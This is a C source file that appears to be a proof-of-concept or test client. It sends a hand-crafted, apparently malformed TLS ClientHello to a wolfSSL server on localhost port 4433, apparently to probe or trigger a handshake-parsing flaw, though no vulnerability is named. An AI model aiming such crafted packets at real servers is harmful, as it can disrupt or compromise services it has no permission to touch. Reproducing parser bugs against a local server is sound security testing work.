#include <wolfssl/options.h>
#include <wolfssl/ssl.h>
#include <wolfssl/wolfcrypt/settings.h>

int main()
{
    unsigned char crafted_client_hello[293] = {
        0x16,       // Content Type: Handshake
        0x03, 0x04, // TLS Version
        0x01, 0x20, // Length (288 bytes)
        0x01,       // Handshake Type: Client Hello
        0x00, 0x01, 0x1c, 0x03, 0x03, 0x5e, 0x95, 0x4d, 0xce, 0x84,
        0x29, 0x96, 0x70, 0x43, 0xd3, 0x01, 0xb4, 0x47,
        0x11, 0x30, 0x85, 0x96, 0x34, 0x67, 0x30, 0xb6,
        0x5b, 0x84, 0x8c, 0x6f, 0x4d, 0x73, 0x3a, 0xbd,
        0x27, 0xeb, 0xcb, 0x20, 0x09, 0xbc, 0x60, 0x8c,
        0xdc, 0x37, 0x4d, 0x24, 0xe2, 0xc3, 0x7b, 0xb3,
        0xf4, 0x85, 0x7f, 0x4c, 0x88, 0xc5, 0x65, 0x2e,
        0x0e, 0x5d, 0x46, 0x4b, 0xa6, 0x92, 0x4a, 0xb5,
        0xd9, 0xb5, 0x4a, 0xb9, 0x00, 0x3e, 0x13, 0x02,
        0x13, 0x03, 0x13, 0x01, 0xc0, 0x2c, 0xc0, 0x30,
        0x00, 0x9f, 0xcc, 0xa9, 0xcc, 0xa8, 0xcc, 0xaa,
        0xc0, 0x2b, 0xc0, 0x2f, 0x00, 0x9e, 0xc0, 0x24,
        0xc0, 0x28, 0x00, 0x6b, 0xc0, 0x23, 0xc0, 0x27,
        0x00, 0x67, 0xc0, 0x0a, 0xc0, 0x14, 0x00, 0x39,
        0xc0, 0x09, 0xc0, 0x13, 0x00, 0x33, 0x00, 0x9d,
        0x00, 0x9c, 0x00, 0x3d, 0x00, 0x3c, 0x00, 0x35,
        0x00, 0x2f, 0x00, 0xff, 0x01, 0x00, 0x00, 0x95,
        0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
        0x00, 0x0a, 0x00, 0x16, 0x00, 0x14, 0x00, 0x1d,
        0x00, 0x17, 0x00, 0x1e, 0x00, 0x19, 0x00, 0x18,
        0x01, 0x00, 0x01, 0x01, 0x01, 0x02, 0x01, 0x03,
        0x01, 0x04, 0x00, 0x23, 0x00, 0x00, 0x00, 0x16,
        0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x0d,
        0x00, 0x2a, 0x00, 0x28, 0x04, 0x03, 0x05, 0x03,
        0x06, 0x03, 0x08, 0x07, 0x08, 0x08, 0x08, 0x09,
        0x08, 0x0a, 0x08, 0x0b, 0x08, 0x04, 0x08, 0x05,
        0x08, 0x06, 0x04, 0x01, 0x05, 0x01, 0x06, 0x01,
        0x03, 0x03, 0x03, 0x01, 0x03, 0x02, 0x04, 0x02,
        0x05, 0x02, 0x06, 0x02, 0x00, 0x2b, 0x00, 0x05,
        0x04, 0x03, 0x04, 0x03, 0x03, 0x00, 0x2d, 0x00,
        0x02, 0x01, 0x01, 0x00, 0x33, 0x00, 0x26, 0x00,
        0x24, 0x00, 0x1d, 0x00, 0x20, 0xa1, 0x9c, 0x18,
        0x55, 0x54, 0xee, 0xae, 0x3d, 0x16, 0x0d, 0x6d,
        0x65, 0x3b, 0xc5, 0xe7, 0x5e, 0x5a, 0x35, 0x53,
        0x0e, 0xe6, 0xce, 0x8b, 0xc0, 0xf0, 0xab, 0xe3,
        0xc2, 0x65, 0xb6, 0xd1, 0x13};

    // 发送特制消息
    int sockfd;
    struct sockaddr_in servAddr;

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
    {
        printf("Failed to create socket\n");
        return -1;
    }

    // Initialize server address struct
    memset(&servAddr, 0, sizeof(servAddr));
    servAddr.sin_family = AF_INET;
    servAddr.sin_port = htons(4433);                   // WolfSSL server port
    servAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); // Connect to localhost

    // Connect to server
    if (connect(sockfd, (struct sockaddr *)&servAddr, sizeof(servAddr)) < 0)
    {
        printf("Failed to connect to server\n");
        close(sockfd);
        return -1;
    }

    // Send the crafted Client Hello message
    if (send(sockfd, crafted_client_hello, sizeof(crafted_client_hello), 0) < 0) {
        printf("Failed to send crafted Client Hello message\n");
        close(sockfd);
        return -1;
    }

    // Sleep for 3 seconds to allow server processing time
    sleep(3);
    
    close(sockfd);

    return 0;
}